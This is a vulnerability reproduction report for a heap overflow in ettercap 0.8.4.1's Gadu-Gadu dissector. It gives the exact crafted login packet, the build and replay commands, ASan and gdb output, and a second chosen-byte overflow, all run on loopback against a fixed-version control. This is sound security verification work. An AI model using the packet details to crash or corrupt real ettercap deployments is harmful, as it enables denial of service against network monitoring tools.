# ettercap2shell — live dissector reproduction of CVE-2026-125401

Date: 2026-11-23 (wake starting 02:57Z). All work stayed on the host loopback
interface inside `lab/frontier/ettercap2shell/`; no external probe, no scan, no
second node. This is a continuation of `reports/frontier-ettercap.md`: that
report measured the helper in a direct-call harness; this one drives the **real
ettercap 0.8.4.1 dissector** with crafted Gadu-Gadu bytes, both as a pcap replay
and as a **live packet sent on `lo`**.

## Result in one paragraph

A single crafted TCP/8074 `GG_LOGIN50_CMD` packet with `version=0x44000042`
makes an ASan-instrumented, unmodified ettercap `v0.8.4.1` write past the end
of its 30-byte `tbuf3` allocation inside `gg_get_version()`, reached from
`dissector_gg()` **before** the per-message length guard. The same packet sent
as a live frame on loopback produces the same report. This upgrades the
frontier's rung-3 result from a harness slice to the real parse stack. A plain,
non-ASan build of the same vulnerable tag aborts on the same packet
(`malloc(): corrupted top size`, 3/3) while the fixed tag stays clean. Rung 4
stays scoped and partial: packet bits choose the extent and which fixed suffix
bytes cross the boundary; there is no arbitrary-byte write, no pointer control
and no command execution. Rung 5 is not claimed. AV:A is not promoted.

## Build provenance

| Item | Value |
|---|---|
| Vulnerable source | `git clone --depth 1 --branch v0.8.4.1`, HEAD `0dc8409779f3a09cbfff4434b9a4d7b33480d88d` |
| `ec_gg.c` SHA-256 | `a97a0984f9c9b62910f3259715287b42cff8dff87115913001f687f0a05189d8` |
| Fixed source | `git clone --depth 1 --branch v0.8.5.1`, HEAD `832524f3c4c215f1007fe9f190dbf052ee965b55` |
| Fixed `ec_gg.c` SHA-256 | `a516ce050828f2c2abec17be35b1b87cea4d2b5c60484c073161d6e8a1fcce8d` |
| libnet | bundled 1.3 tarball, built separately with clean `-O2 -fPIC` |
| Compiler | Ubuntu clang 18.1.3, `CMAKE_BUILD_TYPE=Debug`, `-fsanitize=address -g -O1 -fno-omit-frame-pointer`, `-DCMAKE_EXE_LINKER_FLAGS=-fsanitize=address` |
| CMake switches | `-DENABLE_GTK=OFF -DENABLE_CURSES=ON -DENABLE_PLUGINS=OFF -DENABLE_GEOIP=OFF -DENABLE_IPV6=OFF -DENABLE_TESTS=OFF -DSYSTEM_LIBNET=ON -DBUNDLED_LIBNET=OFF -DLIBNET_INCLUDE_DIR=<...>/inst/include -DLIBNET_LIBRARY=<...>/inst/lib/libnet.a` |
| ASan binary SHA-256 | `82bd9971fbf104928a56c2a418b5a75c4a066d15de593cb8d904cf6cfac60bb7` (vuln), `a6a85b52f7cc20e182cc2274a8c9566fc807e8532cda26d1df78fd5f9c1bbc67` (fixed) |

The bundled libnet build fails when the ettercap-wide ASan flags are exported
into its autotools/libtool configure; building it once with clean flags into a
local prefix and linking it statically avoids that. It is not part of the
vulnerable code path. The two `ec_gg.c` hashes are byte-identical to the
frontier pins (`src/ec_gg.c.v0.8.4.1` and `src/ec_gg.c.v0.8.5.1`), so the
harness slices and the live build are the same shipped source.

## Packet

`live-evidence/gg-vuln.pcap` holds one 78-byte Ethernet frame: IPv4
192.168.1.10:12345 -> 192.168.1.20:8074, TCP PSH+ACK, payload 24 bytes. The
payload is:

```
type   = 0x0000000c  (GG_LOGIN50_CMD, little endian)
len    = 0x00000010  (16 = payload_len - 8, passes ec_gg.c:349)
uin    = 0x00001000
hash   = 0x00002000
status = 0x00000030
version= 0x44000042  (bytes 42 00 00 44 at payload offset 20)
```

`struct gg_login50_hdr` puts `version` at payload offset 20, so a 24-byte
payload is exactly enough to read it. `gg->len - 22 = -6`, so the guard at
`ec_gg.c:361` would reject the message — **but it runs after** the
`gg_get_version()` call at `ec_gg.c:360`. No guard fires first.

## Experiment A — pcap replay through the real dissector

From `build-asan/` (so `./share/etter.conf` resolves):

```
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 \
  ./src/ettercap -T -q -r <pcap> -i lo
```

`live-evidence/replay-vuln.out` reports:

```
ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 13 ... thread T2
  #0 strcat
  #1 gg_get_version       src/dissectors/ec_gg.c:673:4
  #2 dissector_gg         src/dissectors/ec_gg.c:360:4
  #3 decode_data          src/ec_decode.c:305:10
  #4 decode_tcp           src/protocols/ec_tcp.c:295:4
  #5 decode_ip            src/protocols/ec_ip.c:232:4
  #6 decode_eth           src/protocols/ec_eth.c:81:4
  #8 pcap_loop ...        #10 capture src/ec_capture.c:90:10
0 bytes after 30-byte region ... allocated by thread T2:
  #1 dissector_gg         src/dissectors/ec_gg.c:356:4   (SAFE_CALLOC(tbuf3,30,1))
```

## Experiment B — live packet on loopback

`liveinject.py` starts the same binary with `-T -q -z -p -i lo -f 'tcp port
8074'` as root via `sudo -n env EC_UID=1000 EC_GID=1000 ...` (ettercap opens
the capture socket, then drops to the lab owner so it can read its `share/`
files), waits for "Starting Unified sniffing...", then `sendframe.py` sends the
frame from the pcap verbatim with `AF_PACKET`/`SOCK_RAW` bound to `lo`, and the
process is terminated. No interface other than `lo` is touched; the sender is
terminated in the same script.

`live-evidence/live-vuln.out`:

```
Listening on: lo -> 00:00:00:00:00:00, 127.0.0.1/255.0.0.0
Starting Unified sniffing...
ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 13 ... thread T3
  #0 strcat
  #1 gg_get_version       src/dissectors/ec_gg.c:673:4
  #2 dissector_gg         src/dissectors/ec_gg.c:360:4
  #3 decode_data          src/ec_decode.c:305:10
  #4 decode_tcp           src/protocols/ec_tcp.c:295:4
  #5 decode_ip            src/protocols/ec_ip.c:232:4
  #6 decode_eth           src/protocols/ec_eth.c:81:4
  #10 pcap_loop           #11 capture src/ec_capture.c:90:10
0 bytes after 30-byte region ... allocated by thread T3 at ec_gg.c:356
```

The live stack reaches the write through `pcap_loop` on a live capture, not
through `-r`; the bytes on the wire are the crafted ones, not a synthetic
in-process call.

## Controls (same binary, same injection path)

| Packet | version / change | Live result | Replay result |
|---|---|---|---|
| `gg-vuln` | `0x44000042`, both suffix flags | ASan `WRITE of size 13` at `ec_gg.c:673` | same |
| `gg-extent18` | `0x44000018`, low byte maps to `"5.0/4.9"`; both suffix flags | ASan `WRITE of size 12` at `ec_gg.c:676` | same |
| `gg-extent40` | `0x04000042`, only the `eraomnix` flag | ASan `WRITE of size 12` at `ec_gg.c:676` | same |
| `gg-safe` | `0x0000002a` -> `"7.7"`, no flags | no heap overflow | no heap overflow |
| `gg-wrongtype` | type `0x01` (WELCOME) | no heap overflow | no heap overflow |
| `gg-serverdir` | same login from :8074 toward :12345 (server -> client), 60-byte payload | no heap overflow (direction check) | no heap overflow |
| `gg-long` | full 60-byte login payload, `0x44000042` | not run live | ASan `WRITE of size 13` |
| fixed `v0.8.5.1` build | same `gg-vuln` frame | no heap overflow | no heap overflow |

The source explains the two write sizes: `sprintf(str,"unknown (0x%X)",version)`
is 20 bytes for `0x44000042`, then `strcat(" + has audio")` (12 chars + NUL =
13) crosses first at line 673; for `0x44000018` the low byte selects
`"5.0/4.9"`, so only the second `strcat(" + eraomnix")` (11 chars + NUL = 12)
crosses at line 676. For `0x04000042` the same second `strcat` crosses only
with its NUL. The overflow bytes are fixed literal suffixes, not
attacker-chosen arbitrary bytes.

Unrelated harness noise, preserved: on SIGTERM several control runs report
`AddressSanitizer: attempting double-free` in `capture_getifs`/`pcap_freealldevs`
during shutdown, and offline runs report `Joining already joined thread`.
Neither is in the GG path and neither is a finding about this CVE; the control
criterion used here is specifically `heap-buffer-overflow` in `gg_get_version`.

## Experiment C — plain (non-ASan) build: allocator abort, no logger read-back

Both trees were rebuilt without the sanitizer (`live/ettercap-0.8.4.1/build-plain`
and `live/ettercap-0.8.5.1/build-plain`), same CMake switches and the same
statically linked libnet 1.3 prefix, with only
`-DCMAKE_C_FLAGS="-g -O1 -fno-omit-frame-pointer"` instead of the ASan flags.
This asks what the real dissector does when the store is *not* trapped by ASan.

`gg-vuln.pcap` makes the plain vulnerable binary exit 134 with
`malloc(): corrupted top size`, deterministically in 3/3 replays
(`live-evidence/plain-vuln.out`). The gdb batch backtrace
(`live-evidence/plain-gdb.out`) places the abort in `_int_malloc` ->
`__libc_calloc`, called from `top_half_queue_add` (`ec_dispatcher.c:160`) at the
tail of `decode_data` (`ec_decode.c:328`) — the first allocation after the GG
app decoder has run, not a shutdown artefact.

Plain-build control matrix (one replay each, exit status and first fatal line):

| Packet | version / change | Result |
|---|---|---|
| `gg-vuln` | `0x44000042`, both suffix flags | 134, `malloc(): corrupted top size` (3/3) |
| `gg-long` | same version, 60-byte payload | 134, same abort |
| `gg-safe` | `0x0000002a` -> `"7.7"` | 0, clean |
| `gg-extent18` | `0x44000018`, short base | 0, clean |
| `gg-extent40` | `0x04000042`, one flag | 0, clean |
| `gg-wrongtype` | type `0x01` | 0, clean |
| `gg-serverdir` | from :8074 toward :12345 | 0, clean |
| fixed `v0.8.5.1` plain build | `gg-vuln` | 0, clean (`live-evidence/plain-fixed.out`) |

The only difference between the aborting and clean inputs is the version bits
that decide whether the 43-character composition crosses the 30-byte boundary;
glibc's message identifies a corrupted top-chunk size as the detected symptom.
The exact offset of the stray bytes inside the top-chunk header was not measured
separately, so the claim is "this packet deterministically corrupts allocator
state and aborts the plain dissector process", not a modelled heap layout.

Bounded negative on the natural consumer: the `DISSECT_MSG` `VERSION: %s` call
at `ec_gg.c:376` produces no line in text-mode stdout or in the `-m` message
log for either `gg-vuln` or `gg-safe`, so there is no logger read-back
of the OOB bytes to report. On the vulnerable packet the allocator abort
precedes any later consumer. A gdb attempt to dump `tbuf3` after the call
failed because the process aborts before the memory could be read; the ASan
write report in Experiment A remains the direct evidence of the bytes.
Experiment D below uses a different packet (long chosen description, safe
version) and does get a natural `VERSION:` read-back at a different sink.

## Experiment D — folded `tbuf2` description claim (2026-11-27)

Operator DM #6252 asked for a bounded check of the claim folded into this lane
from the declined twin staging row
(`reports/frontier-ettercapgg2shell.md:106-120`): the fixed tag adds a
`copy_len` guard around `strncpy(tbuf2, description, gg->len - offset)`, which
might make a *fully chosen-byte* overflow reachable. Pinned source check
settles the fixed half: `v0.8.5.1/src/dissectors/ec_gg.c:168` defines
`GG_MAX_LEN 70`, `:364` allocates `tbuf2` with `GG_MAX_LEN + 1 = 71` bytes,
and every login/status site (`:370-375`, `:397-399`, `:423-425`, `:474-476`,
`:490-492`, `:506-508`, `:525-527`, `:543-546`) uses
`size_t offset`, `if (gg->len < offset) GG_BAIL()`, then
`size_t copy_len = MIN(gg->len - offset, GG_MAX_LEN)` followed by
`strncpy(tbuf2, ..., copy_len); tbuf2[copy_len] = '\0';`. `:358` also requires
`gg->len == PACKET->DATA.len - 8`. Worst case is copy 70 bytes plus a NUL at
index 70 of a 71-byte object: **no fixed-tag overflow**, reachable or not.

The vulnerable tag is different. `v0.8.4.1:354-364` allocates the same
71-byte `tbuf2` but copies `gg->len - 22` bytes with only a signed-negative
guard, so a long LOGIN50 description writes packet-chosen bytes past the
object. Three offline pcaps from `live-evidence/mkdescpcap.py` carry safe
version `0x2a` ("7.7") and a known description pattern
`description[i] = (0x41 + i) mod 256`, isolating this sink from
`gg_get_version`:

| Packet | GG payload len | vulnerable `copy_len` | vulnerable ASan | fixed ASan |
|---|---|---|---|---|
| `gg-desc-safe` | 84 | 62 | clean | clean |
| `gg-desc-edge` | 93 | 71 | `WRITE of size 1`, `ec_gg.c:364` (`tbuf2[71]='\0'`) | clean |
| `gg-desc-long` | 132 | 110 | `WRITE of size 110`, `strncpy` frame, `ec_gg.c:363`, `0 bytes after 71-byte region` allocated at `ec_gg.c:355` | clean |

The `gg-desc-long` ASan report goes through the real parse stack
(`decode_data -> decode_tcp -> decode_ip -> decode_eth -> pcap_loop ->
capture`) and is deterministic in 3/3 replays; the fixed build's only report
is the pre-existing `Joining already joined thread` shutdown race. Raw logs:
`live-evidence/asan-desc-{safe,edge,long}-{0.8.4.1,0.8.5.1}.out`.

The plain vulnerable build adds a natural read-back of the chosen bytes into
a **named adjacent field**. `live-evidence/plain-desc-long-0.8.4.1.out`
prints `DISSECT_MSG` with `STATUS:` = chosen description bytes through
pattern index 109 and `VERSION: %s` = `91 92 93 94 95 96 97 98 99 9a 9b 9c
9d 9e 9f a0 a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae` (pattern indices
80..109), then exits 134 with `free(): invalid size`. In a gdb batch at
`dissector_gg` (`live-evidence/gdb-desc-adj.out`) `tbuf2 = 0x...0c50`,
`tbuf3 = 0x...0ca0`, `$3 = tbuf3 - tbuf2 = 80`: the bytes read back through
`VERSION:` are exactly the packet-chosen description bytes that crossed into
the adjacent `tbuf3` scratch buffer. The same packet on the fixed plain build
exits 0 with `VERSION: 7.7`; vulnerable `desc-safe` and `desc-edge` also exit
0 and print `VERSION: 7.7`. Plain long vulnerable is 134 in 3/3 runs. Raw
logs: `live-evidence/plain-desc-{safe,edge,long}-{0.8.4.1,0.8.5.1}.out`.

This is the folded `tbuf2` sink, **not** the advisory's `gg_get_version`
sink. It gives the lane a measured chosen-byte write into a named live field
with logger read-back and a fixed-build guard, but no pointer control, no
marker execution and no command; AV:A and the rung-5 boundary are unchanged.

## Rung assessment

- **Rung 1 (suspected):** yes, source and advisory agree.
- **Rung 2 (reproducible crash):** yes, deterministic single packet, both
  replay and live.
- **Rung 3 (confirmed memory corruption):** yes — ASan `WRITE of size 13`,
  `0 bytes after 30-byte region`, allocation at `dissector_gg:356`, write in
  `gg_get_version`, on the shipped vulnerable source.
- **Rung 4 (demonstrated impact):** scoped and partial. At the advisory's
  `gg_get_version` sink, input bits select whether and how far the write
  crosses, and which fixed suffix byte lands at the boundary (WRITE 13 vs
  WRITE 12 at two source lines). The overwritten bytes there are constants
  from the helper: no arbitrary-byte write, no pointer control, no benign
  marker execution. On a plain build that packet deterministically corrupts
  allocator state and aborts the dissector process (`malloc(): corrupted top
  size`, 3/3), with a fixed-build clean control — a real availability effect,
  not just a sanitizer marker. For that packet the `DISSECT_MSG` `VERSION: %s`
  call emits no line in text mode and the allocator abort precedes it.
  Separately, Experiment D measures the folded `tbuf2` description sink: a
  110-byte packet-chosen copy into a 71-byte object, with chosen bytes at
  `tbuf2+80..109` read back through the named adjacent `tbuf3` field in a
  plain-build `VERSION:` log line and a clean fixed-build guard. That sink
  still yields no pointer control, marker execution or command, and is not
  the advisory's `gg_get_version` sink.
- **Rung 5 (remote command execution):** no. No attacker-controlled command,
  no side effect beyond the deterministic abort / ASan detection, and the
  injection was from the same host on `lo`, not from an adjacent network peer.

The advisory's AV:A remains a constraint. Reaching the dissector from a real
adjacent-network sender was not attempted; ettercap's normal deployment sees
traffic it is positioned to observe, which is exactly why the AV:A scope is
kept.

## Reproduction

Scripts and small artifacts are under `lab/frontier/ettercap2shell/live/`; the
durable copies are `lab/frontier/ettercap2shell/live-evidence/`:

```
cd lab/frontier/ettercap2shell/live
python3 mkggpcap.py gg-vuln.pcap          # or mkcontrols.py
cd ettercap-0.8.4.1/build-asan
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 \
  ./src/ettercap -T -q -r ../../gg-vuln.pcap -i lo
cd ../..
python3 liveinject.py gg-vuln.pcap        # sends one frame on lo, then stops ettercap
```

Full cmake invocations are recorded in `live-evidence/README.md`.

For Experiment D, regenerate the three chosen-description pcaps and replay
them through both builds:

```
python3 lab/frontier/ettercap2shell/live-evidence/mkdescpcap.py
cd lab/frontier/ettercap2shell/live/ettercap-0.8.4.1/build-asan
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 \
  ./src/ettercap -T -q -r ../../../live-evidence/gg-desc-long.pcap -i lo
cd ../../../../../..
cd lab/frontier/ettercap2shell/live/ettercap-0.8.5.1/build-plain
./src/ettercap -T -q -r ../../../live-evidence/gg-desc-long.pcap -i lo
```

## Evidence index

- `live-evidence/gg-*.pcap` — the original seven captures (78/154 bytes each)
  plus `gg-desc-{safe,edge,long}.pcap` from Experiment D, generated by
  `live-evidence/mkdescpcap.py` (hashes recorded in the wall).
- `live-evidence/live-*.out` — six live-loopback runs.
- `live-evidence/replay-*.out` — vulnerable and fixed offline replay (ASan).
- `live-evidence/plain-*.out` — plain-build abort, fixed control, safe control
  and gdb abort backtrace (Experiment C, 2026-11-26) plus the six
  chosen-description logs (Experiment D, 2026-11-27).
- `live-evidence/asan-desc-*.out` and `gdb-desc-adj.out` — Experiment D ASan
  matrix, chosen-byte read-back and measured `tbuf3 - tbuf2 = 80`.
- `lab/frontier/ettercap2shell/PROVENANCE.md` — earlier pin/harness provenance.

## What would change the mind

A live capture that reaches `gg_get_version()` only after a rejecting guard;
the fixed tag not matching the shipped 0.8.5.1 bytes; pointer control or
command execution from the overwritten bytes; or an adjacent-network sender
reproducing the write. Chosen-byte read-back through a named field is no
longer open (Experiment D, `tbuf2` sink). None of the remaining items was
observed.
